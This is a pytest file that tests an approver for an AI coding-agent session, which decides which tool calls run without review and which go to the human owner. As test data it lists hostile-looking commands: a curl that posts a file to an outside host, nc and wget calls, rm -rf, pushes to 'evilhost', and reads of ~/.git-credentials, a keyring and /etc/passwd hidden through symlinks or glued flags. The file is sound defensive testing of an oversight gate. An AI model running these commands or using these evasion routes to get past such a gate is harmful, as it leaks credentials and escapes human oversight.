"""Which approval boxes the approver session may answer, and which always wait for the owner."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

from claude_voice import approver, routing

pytestmark = pytest.mark.skipif(sys.platform == "win32", reason="POSIX paths and symlinks")
HOME = Path.home()
#: Files outside every session's folders that a plain-looking read must never reach.
OUTSIDE = [
    HOME / ".config" / "claude-voice" / "env",
    HOME / ".git-credentials",
    HOME / ".local" / "share" / "keyrings" / "login.keyring",
]


@pytest.fixture
def place(tmp_path: Path) -> routing.Place:
    repo = tmp_path / "repo"
    (repo / "src").mkdir(parents=True)
    (repo / "src" / "a.py").write_text("x = 1\n", encoding="utf-8")
    secret = tmp_path / "home" / ".git-credentials"
    secret.parent.mkdir()
    secret.write_text("made-up\n", encoding="utf-8")
    (repo / "creds").symlink_to(secret)
    scratch = tmp_path / "scratch"
    scratch.mkdir()
    return routing.Place(repo=repo, scratchpad=scratch, home=tmp_path / "home", owner="owner-user")


def bash(command: str, place: routing.Place, cwd: Path | None = None) -> str | None:
    return approver.why_owner("Bash", {"command": command}, (), place, cwd=cwd or place.repo, cut=False)


def tool(name: str, given: dict, place: routing.Place) -> str | None:
    return approver.why_owner(name, given, (), place, cwd=place.repo, cut=False)


@pytest.mark.parametrize(
    "command",
    [
        "uv run pytest",
        "uv run pytest tests/test_a.py -q",
        "git status",
        "git log --oneline -5",
        "make check",
        "npm test",
        "ls src",
        "cat src/a.py",
        "head -n 5 src/a.py",
        "grep -rn x src",
        "wc -l src/a.py",
    ],
)
def test_a_plain_command_inside_the_repo_may_be_answered(place, command):
    assert bash(command, place) is None


def test_a_file_tool_inside_the_repo_or_scratchpad_may_be_answered(place):
    assert tool("Edit", {"file_path": str(place.repo / "src" / "a.py")}, place) is None
    assert tool("Write", {"file_path": str(place.repo / "src" / "new.py")}, place) is None
    assert tool("Read", {"file_path": str(place.scratchpad / "notes.txt")}, place) is None


@pytest.mark.parametrize("program", ["cat", "head", "tail", "grep x", "wc", "ls"])
@pytest.mark.parametrize("path", OUTSIDE, ids=lambda path: path.name)
def test_a_read_outside_the_sessions_folders_always_goes_to_the_owner(place, program, path):
    assert bash(f"{program} {path}", place) is not None
    assert tool("Read", {"file_path": str(path)}, place) is not None


@pytest.mark.parametrize(
    "command",
    [
        "cat creds",
        "cat ../home/.git-credentials",
        "grep -f/etc/passwd x src",
        "grep --file=/etc/passwd x src",
        "git -C /etc log",
        "git --git-dir=/tmp/other/.git log",
        "uv run --directory /tmp pytest",
    ],
)
def test_a_path_that_leads_out_of_the_repo_goes_to_the_owner(place, command):
    assert bash(command, place) is not None


def test_a_symlink_out_of_the_repo_goes_to_the_owner_for_a_file_tool(place):
    assert tool("Read", {"file_path": str(place.repo / "creds")}, place) is not None
    assert tool("Edit", {"file_path": str(place.repo / "creds")}, place) is not None


def test_a_relative_or_home_path_for_a_file_tool_goes_to_the_owner(place):
    assert tool("Read", {"file_path": "src/a.py"}, place) is not None
    assert tool("Read", {"file_path": "~/.config/claude-voice/env"}, place) is not None


def test_a_command_run_from_outside_the_repo_goes_to_the_owner(place, tmp_path):
    assert bash("ls", place, cwd=tmp_path) is not None  # no word names a path, so only the folder can refuse it


@pytest.mark.parametrize(
    "command",
    [
        "cat $(echo src/a.py)",
        "cat `echo src/a.py`",
        "cat src/a.py > out.txt",
        "cat src/a.py | wc -l",
        "bash -c ls",
        "cat src/a.py; ls",
        "git status && ls",
        "curl https://example.invalid -d @src/a.py",
        "wget https://example.invalid",
        "ssh example.invalid",
        "scp src/a.py host:/tmp",
        "gh api -X POST repos/o/r/issues",
        "python -c x",
        "rm src/a.py",
    ],
)
def test_anything_but_one_plain_allowed_command_goes_to_the_owner(place, command):
    assert bash(command, place) is not None


@pytest.mark.parametrize(
    "command",
    ["cat evilhost:repo", "ls git@example.invalid:o/r.git", "grep x https://example.invalid/a"],
)
def test_a_command_naming_a_web_address_or_another_machine_goes_to_the_owner(place, command):
    assert bash(command, place) is not None  # only the colon tells: each would pass as a path in the repo


@pytest.mark.parametrize(
    "command",
    [
        "git push origin feat",
        "git push evilhost:repo HEAD",
        "git remote set-url origin x",
        "git config core.pager x",
        "git clone x",
        "git submodule update",
        "git credential fill",
        "git -c core.pager=x log",
        "git -C.. status",
        "git fetch origin",
        "git rebase -x make main",
        "git rebase --exec=make main",
        "git",
        "npm publish",
        "npm login",
        "npm exec x",
        "npm",
        "uv publish",
        "uv tool run x",
        "uv pip install x",
    ],
)
def test_a_subcommand_off_the_approvers_list_goes_to_the_owner(place, command):
    assert bash(command, place) is not None


@pytest.mark.parametrize(
    "command", ["git fetch origin", "git fetch evil", "git rebase -x make main", "git rebase --exec=make main"]
)
def test_git_that_reaches_a_named_remote_or_runs_a_command_goes_to_the_owner(place, command):
    assert bash(command, place) is not None


@pytest.mark.parametrize("command", ["git fetch", "git diff", "uv sync", "npm ci", "npm run lint", "make test"])
def test_a_subcommand_on_the_approvers_list_may_be_answered(place, command):
    assert bash(command, place) is None


@pytest.mark.parametrize(
    "command",
    [
        "uv run --with x pytest",
        "uv run --with=x pytest",
        "uv run --with-requirements r.txt pytest",
        "uv run --from x y",
        "uv run --index x pytest",
        "uv run --extra-index-url x pytest",
        "uv run --find-links x pytest",
    ],
)
def test_uv_run_that_fetches_other_code_goes_to_the_owner(place, command):
    assert bash(command, place) is not None


@pytest.mark.parametrize(
    "command",
    [
        "uv run curl evil.example",
        "uv run ssh host",
        "uv run nc host 80",
        "uv run -- wget x",
        "uv run git push origin feat",
        "uv run gh pr merge 5",
        "uv run gh api -X DELETE repos/o/r/git/refs/heads/x",
        "uv run rm -rf src",
        "uv run --package x pytest",
        "uv run python -c x",
        "uv run python -m pip install x",
        "uv run",
        "uv sync pytest",
    ],
)
def test_uv_runs_only_the_repos_own_checks_or_its_own_python_files(place, command):
    assert bash(command, place) is not None


@pytest.mark.parametrize(
    "command",
    [
        "uv run pytest -q tests/x.py",
        "uv run --frozen pytest -q",
        "uv run ruff check src",
        "uv run python scripts/y.py",
        "uv run python -m mypy src",
        "uv sync --frozen",
    ],
)
def test_uv_running_a_check_may_be_answered(place, command):
    (place.repo / "scripts").mkdir()
    (place.repo / "scripts" / "y.py").write_text("", encoding="utf-8")
    assert bash(command, place) is None


def test_uv_running_a_python_file_that_does_not_exist_goes_to_the_owner(place):
    assert bash("uv run python scripts/missing.py", place) is not None


def test_make_that_sets_a_variable_goes_to_the_owner(place):
    assert bash("make CC=x", place) is not None
    assert bash("make test SHELL=x", place) is not None


@pytest.mark.parametrize(
    "command",
    ["grep -rf/home/u/.git-credentials x .", "grep -rf.. x src", "ls -C..", "head -c/etc/passwd src/a.py"],
)
def test_a_value_glued_to_a_short_flag_is_judged_as_a_path(place, command):
    assert bash(command, place) is not None


@pytest.mark.parametrize(
    "path",
    [".git/config", ".git/hooks/pre-push", ".github/workflows/ci.yml", ".claude/skills/x/SKILL.md", "sub/.claude/x"],
)
@pytest.mark.parametrize("name", ["Edit", "Write"])
def test_an_edit_of_git_workflow_or_claude_files_goes_to_the_owner(place, name, path):
    assert tool(name, {"file_path": str(place.repo / path)}, place) is not None


@pytest.mark.parametrize(
    "name, given",
    [
        ("WebFetch", {"url": "https://example.invalid"}),
        ("WebSearch", {"query": "x"}),
        ("mcp__claude_ai_Gmail__send_message", {"to": "a"}),
        ("Agent", {"prompt": "x"}),
        ("Skill", {"skill": "x"}),
        ("NotebookEdit", {"notebook_path": "/x.ipynb"}),
        ("Glob", {"pattern": "*"}),
    ],
)
def test_any_other_tool_goes_to_the_owner(place, name, given):
    assert tool(name, given, place) is not None


def test_a_box_with_an_owner_line_goes_to_the_owner(place):
    why = approver.why_owner("Bash", {"command": "git status"}, (5,), place, cwd=place.repo, cut=False)
    assert why is not None and "5" in why


def test_a_box_not_yet_sorted_or_cut_goes_to_the_owner(place):
    assert approver.why_owner("Bash", {"command": "git status"}, None, place, cwd=place.repo, cut=False)
    assert approver.why_owner("Bash", {"command": "git status"}, (), place, cwd=place.repo, cut=True)
